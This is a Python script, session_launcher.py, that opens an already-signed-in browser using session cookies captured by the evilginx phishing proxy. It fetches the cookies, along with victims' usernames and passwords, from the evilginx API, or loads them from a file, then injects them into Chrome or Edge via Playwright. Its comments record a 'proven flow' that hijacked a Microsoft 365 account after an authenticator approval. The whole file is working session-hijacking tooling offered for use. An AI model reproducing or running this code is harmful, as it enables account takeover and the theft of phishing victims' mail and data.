#!/usr/bin/env python3
# session_launcher.py — open an ALREADY-SIGNED-IN browser with evilginx session cookies
#
# Two cookie sources:
#   --from-session <id>  : fetched straight from the evilginx API (mTLS) — a db session
#   --cookies <file>     : from a JSON file (Cookie-Editor array or evilginx db format)
#
# Proven flow (MS365 consumer personal, session #54, 16:05 UTC 09-09):
#   lure ?t=/EbUSnaiI -> /signin?client_id (login page) -> password (post.srf) ->
#   authenticator approve -> office.com landing (session issued) -> office.com signed-in
#
# Usage:
#   /opt/sessionkeeper/venv/bin/python session_launcher.py \
#     --from-session 54 --url https://www.office.com \
#     --api-host 127.0.0.1:9443 --cfgdir /home/ubuntu/.evilginx/api \
#     --headless --no-sandbox
#
#   python session_launcher.py --cookies outlook-full-import.json \
#     --url https://www.office.com            # on a Windows client, uses the system Chrome
#
# Notes:
#   - __Host-* cookies are injected via url (NO Domain attribute — RFC 6265bis;
#     browsers reject them otherwise -> the session-loop root cause fixed in 4cb949f)
#   - the default profile persists across runs -> sessions survive

import argparse
import glob
import json
import os
import shutil
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.request
from urllib.parse import urlparse


def err(msg):
    print("[!] " + msg)
    sys.exit(1)


def find_browser(explicit):
    if explicit:
        return explicit
    candidates = [
        os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe"),
        os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"),
        os.path.expandvars(r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"),
    ]
    for p in candidates:
        if os.path.isfile(p):
            return p
    for p in ["/usr/bin/google-chrome", "/usr/bin/chromium-browser", "/usr/bin/chromium"]:
        if os.path.exists(p):
            return p
    err("Chrome/Edge not found — pass --chrome <path>")


def summarize(cookies):
    print(f"[*] {len(cookies)} cookies:")
    for c in cookies:
        vlen = len(c.get("value", ""))
        print(f"    {c.get('domain','?'):35s} {c.get('name','?'):28s} ({vlen}B)")


def load_cookies_file(path):
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    out = []
    if isinstance(data, dict):
        # evilginx db format
        for dom, cookies in data.items():
            for name, tok in cookies.items():
                if isinstance(tok, dict):
                    out.append(
                        {
                            "domain": dom,
                            "name": tok.get("Name", name),
                            "value": tok.get("Value", ""),
                            "path": tok.get("Path", "/"),
                            "httpOnly": bool(tok.get("HttpOnly", False)),
                        }
                    )
                else:
                    out.append({"domain": dom, "name": name, "value": str(tok), "path": "/"})
    elif isinstance(data, list):
        # Cookie-Editor format
        out = data
    else:
        err("unrecognized cookies JSON format")
    return out


def fetch_session_cookies(session_id, api_host, cfgdir):
    cert = os.path.join(cfgdir, "client.crt")
    key = os.path.join(cfgdir, "client.key")
    meta = json.load(open(os.path.join(cfgdir, "config.json")))
    base = meta.get("base_path", "")
    if not base:
        err("cfgdir config.json missing base_path")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)
    url = f"https://{api_host}{base}/sessions/{session_id}"
    with urllib.request.urlopen(url, context=ctx, timeout=15) as resp:
        data = json.loads(resp.read())
    out = []
    for dom, cookies in (data.get("tokens") or {}).items():
        for name, tok in cookies.items():
            out.append(
                {
                    "domain": dom,
                    "name": name,
                    "value": tok.get("Value", ""),
                    "path": tok.get("Path", "/") or "/",
                    "httpOnly": bool(tok.get("HttpOnly", False)),
                }
            )
    return data.get("username", ""), data.get("password", ""), out


def to_playwright_cookies(cookies):
    out = []
    for c in cookies:
        dom = (c.get("domain") or "").lower()
        name = c.get("name") or ""
        value = c.get("value") or ""
        if not dom or not name or value == "":
            continue
        pc = {"name": name, "value": value}
        # __Host-* cookies: NEVER carry a Domain attribute (RFC 6265bis —
        # browsers reject the whole cookie). Inject via url -> host-only on the right host.
        # Playwright note: with 'url' present, 'path' must be omitted
        if name.startswith("__Host-"):
            pc["url"] = f"https://{dom.lstrip('.')}/"
            pc["secure"] = True
        else:
            pc["domain"] = dom
            pc["secure"] = True
            pc["path"] = c.get("path", "/") or "/"
        pc["httpOnly"] = bool(c.get("httpOnly", c.get("HttpOnly", False)))
        exp = c.get("expirationDate") or c.get("Expires") or c.get("expires")
        if exp:
            pc["expires"] = int(exp)
        pc["sameSite"] = "Lax"
        out.append(pc)
    return out


def launch_with_cookies(cookie_dicts, url, chrome="", profile="", port=9222,
                        fresh=False, headless=False, no_sandbox=False,
                        disable_http2=False, keep_open=True):
    """Shared entry (imported by egconsole/MCP): launch browser + inject cookies + goto url.
    Returns (page_url, page_title) after navigation. The browser keeps running after return."""
    browser_path = find_browser(chrome)
    profile = profile or os.path.join(tempfile.gettempdir(), f"session-launcher-{int(time.time())}")

    if fresh and os.path.isdir(profile):
        shutil.rmtree(profile, ignore_errors=True)

    print(f"[*] browser : {browser_path}")
    print(f"[*] profile : {profile}")
    print(f"[*] CDP port: {port}")

    launch_args = [
        browser_path,
        f"--user-data-dir={profile}",
        f"--remote-debugging-port={port}",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-features=Translate",
    ]
    if headless:
        launch_args.append("--headless=new")
    if no_sandbox:
        launch_args.append("--no-sandbox")
    if disable_http2:
        launch_args.append("--disable-http2")
    launch_args.append("about:blank")

    subprocess.Popen(launch_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cdp_ready = False
    for _ in range(40):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2)
            cdp_ready = True
            break
        except Exception:
            time.sleep(0.5)
    if not cdp_ready:
        err(f"CDP port {port} not open after 20s")

    from playwright.sync_api import sync_playwright

    final_url, title = "", ""
    with sync_playwright() as pw:
        browser = pw.chromium.connect_over_cdp(f"http://127.0.0.1:{port}")
        ctx = browser.contexts[0] if browser.contexts else browser.new_context()
        pw_cookies = to_playwright_cookies(cookie_dicts)
        try:
            ctx.add_cookies(pw_cookies)
            print(f"[*] injected {len(pw_cookies)} cookies")
        except Exception as e:
            err(f"cookie injection failed: {e}")

        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=60000)
        except Exception as e:
            print(f"[!] navigation note: {e}")
        final_url, title = page.url, page.title()
        print(f"[*] opened: {final_url}")
        print(f"[*] title : {title}")
    return final_url, title


def main():
    ap = argparse.ArgumentParser(description="Session launcher — open a signed-in browser")
    ap.add_argument("--from-session", type=int, default=None, help="evilginx db session id")
    ap.add_argument("--cookies", default="", help="cookies JSON file (Cookie-Editor or db format)")
    ap.add_argument("--api-host", default="127.0.0.1:9443", help="evilginx API host:port")
    ap.add_argument("--cfgdir", default=os.path.expanduser("~/.evilginx/api"), help="API cert dir")
    ap.add_argument("--url", default="https://www.office.com", help="target URL after cookie injection")
    ap.add_argument("--profile", default="", help="browser profile dir (default: per-session temp)")
    ap.add_argument("--fresh", action="store_true", help="wipe the profile before opening")
    ap.add_argument("--headless", action="store_true", help="run hidden (server)")
    ap.add_argument("--no-sandbox", action="store_true", help="add --no-sandbox (Ubuntu 23.10+)")
    ap.add_argument("--port", type=int, default=9222, help="CDP port")
    ap.add_argument("--chrome", default="", help="chrome/edge binary path")
    ap.add_argument("--disable-http2", action="store_true", help="disable HTTP/2 (fixes ERR_HTTP2 with login.live.com headless)")
    ap.add_argument("--out", default="", help="write converted cookies to JSON (debug)")
    args = ap.parse_args()

    if not args.from_session and not args.cookies:
        err("need --from-session <id> or --cookies <file>")

    if args.from_session:
        username, _pw, cookie_dicts = fetch_session_cookies(
            args.from_session, args.api_host, os.path.expanduser(args.cfgdir))
        print(f"[*] session #{args.from_session}: {username}")
    else:
        cookie_dicts = load_cookies_file(args.cookies)

    if not cookie_dicts:
        err("no cookies")

    if args.out:
        json.dump(to_playwright_cookies(cookie_dicts), open(args.out, "w"), indent=2)

    profile = args.profile or os.path.join(
        tempfile.gettempdir(), f"session-launcher-{args.from_session or 'x'}")
    launch_with_cookies(cookie_dicts, args.url, chrome=args.chrome, profile=profile,
                        port=args.port, fresh=args.fresh, headless=args.headless,
                        no_sandbox=args.no_sandbox, disable_http2=args.disable_http2)
    print("[*] browser is open — interact freely. Script exits (browser stays).")


if __name__ == "__main__":
    main()
